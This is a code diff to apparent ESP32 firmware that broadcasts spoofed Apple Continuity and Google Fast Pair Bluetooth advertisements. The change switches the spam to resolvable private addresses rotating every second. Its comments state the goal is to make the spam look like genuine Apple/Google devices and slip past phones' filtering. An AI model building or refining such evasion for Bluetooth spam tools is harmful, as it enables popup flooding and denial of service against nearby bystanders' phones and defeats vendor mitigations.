@@ -25,6 +25,7 @@
 #include "nimble/nimble_port_freertos.h"
 #include "host/ble_hs.h"
 #include "host/ble_hs_id.h"
+#include "host/ble_hs_pvcy.h"
 #include "host/util/util.h"
 #include "services/gap/ble_svc_gap.h"
 
@@ -45,8 +46,34 @@ static void on_reset(int reason) {
     ESP_LOGW(TAG, "NimBLE host reset, reason=%d", reason);
 }
 
+// Real Apple/Google devices advertise Continuity/Fast Pair data from a
+// Resolvable Private Address (top two bits of the address = 0b01) — spam
+// broadcast from a Non-Resolvable Private Address (0b00) is easy for a
+// phone to filter out before it even parses the payload. ESP32-S3's
+// controller supports controller-based RPA generation/rotation, so set an
+// identity IRK + static random identity address once at sync and let the
+// controller mint real RPAs (own_addr_type=BLE_OWN_ADDR_RPA_RANDOM_DEFAULT
+// in spam_tick), rotating fast (1s, the HCI minimum) instead of the
+// manual re-randomize-every-tick NRPA approach this replaced.
+static void setup_rpa_identity(void) {
+    ble_addr_t static_addr;
+    if (ble_hs_id_gen_rnd(0, &static_addr) != 0) {
+        ESP_LOGW(TAG, "Failed to generate static random identity address");
+        return;
+    }
+    if (ble_hs_id_set_rnd(static_addr.val) != 0) {
+        ESP_LOGW(TAG, "Failed to set static random identity address");
+        return;
+    }
+    // Identity IRK is auto-provisioned by the NimBLE host during startup
+    // (ble_hs_startup.c); we only need to supply the static random identity
+    // address above and a short rotation period.
+    ble_hs_set_rpa_timeout(1);
+}
+
 static void on_sync(void) {
     ble_hs_util_ensure_addr(0);
+    setup_rpa_identity();
     host_synced = true;
     ESP_LOGI(TAG, "NimBLE host synced");
 }
@@ -205,13 +232,6 @@ static const uint8_t fastpair_model_ids[][3] = {
     {0x71, 0xF1, 0x38},
 };
 
-static void randomize_adv_address(void) {
-    ble_addr_t addr;
-    if (ble_hs_id_gen_rnd(1, &addr) == 0) {
-        ble_hs_id_set_rnd(addr.val);
-    }
-}
-
 static int build_apple_payload(uint8_t *buf) {
     uint8_t action = apple_action_types[esp_random() % (sizeof(apple_action_types) / sizeof(apple_action_types[0]))];
     uint8_t len = 0;
@@ -253,7 +273,6 @@ static int build_android_payload(uint8_t *buf) {
 
 static void spam_tick(void *arg) {
     ble_gap_adv_stop();
-    randomize_adv_address();
 
     uint8_t payload[31];
     ble_spam_mode_t use_mode = spam_mode;
@@ -273,7 +292,7 @@ static void spam_tick(void *arg) {
         .itvl_min = 0,
         .itvl_max = 0,
     };
-    int rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &adv_params, NULL, NULL);
+    int rc = ble_gap_adv_start(BLE_OWN_ADDR_RPA_RANDOM_DEFAULT, NULL, BLE_HS_FOREVER, &adv_params, NULL, NULL);
     if (rc != 0) {
         ESP_LOGW(TAG, "ble_gap_adv_start failed, rc=%d", rc);
     }
